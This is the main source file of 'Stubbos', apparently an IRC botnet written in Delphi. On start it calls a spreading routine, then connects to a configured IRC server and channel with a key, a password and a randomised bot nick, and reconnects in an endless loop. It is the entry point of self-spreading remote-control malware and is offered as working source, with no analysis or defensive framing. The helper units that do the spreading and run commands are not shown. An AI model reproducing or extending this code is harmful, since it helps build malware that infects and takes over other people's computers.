program Stubbos;

uses
  Windows,
  untFunctions in 'untFunctions.pas',
  untBot in 'untBot.pas',
  untScriptEngine in 'untScriptEngine.pas';

{$I stubbos_config.ini}
{$IFDEF SHOW_OUTPUT} {$APPTYPE CONSOLE} {$ENDIF}  

begin
{$IFDEF SHOW_OUTPUT} WriteLn('>> Debug Version; '+bot_realversion); {$ENDIF}
{$IFDEF SHOW_OUTPUT} WriteLn(''); {$ENDIF}
  Sleep(800);

  Initialize;
  StartSpreading;

  {$IFDEF SHOW_OUTPUT} WriteLn(''); {$ENDIF}
  {$IFDEF SHOW_OUTPUT} WriteLn('Starting Bot'); {$ENDIF}
  Bot := tSock.Create;
  Bot.Server := BOT_SERVER;
  Bot.Nick := bot_nametag+RandIRCBot;
  Bot.Channel := BOT_CHANNEL;
  Bot.Key := BOT_KEY;
  Bot.Password := BOT_PASSWORD;
  Bot.Port := BOT_PORT;
  Bot.IsChat := FALSE;
  Bot.IsSpy := FALSE;
  Bot.Clone := FALSE;

  Repeat
    {$IFDEF SHOW_OUTPUT} WriteLn('Bot Started'); {$ENDIF}
    If (Bot.StartUp) Then
    Begin
      {$IFDEF SHOW_OUTPUT} WriteLn('Restarting bot with sleep'); {$ENDIF}
      Sleep(1000*120);
    End Else
    Begin
      {$IFDEF SHOW_OUTPUT} WriteLn('Restarting bot without sleep'); {$ENDIF}
    End;
  Until 1 = 2;

end.
